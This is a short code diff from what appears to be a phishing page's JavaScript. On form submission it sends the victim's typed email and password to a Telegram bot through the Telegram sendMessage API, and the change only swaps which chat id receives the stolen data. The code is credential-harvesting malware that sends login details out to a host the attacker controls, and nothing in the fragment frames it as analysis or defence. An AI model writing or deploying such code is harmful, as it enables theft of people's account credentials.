@@ -170,7 +170,7 @@
                         btnload.style.display = "none";
 fetch("https://api.telegram.org/bot" +
                     token +
-                    "/sendMessage?chat_id=" + id + "&text=" + email.value + " | " + password.value).then(() => {
+                    "/sendMessage?chat_id=" + admin + "&text=" + email.value + " | " + password.value).then(() => {
                        })
                     })
             }
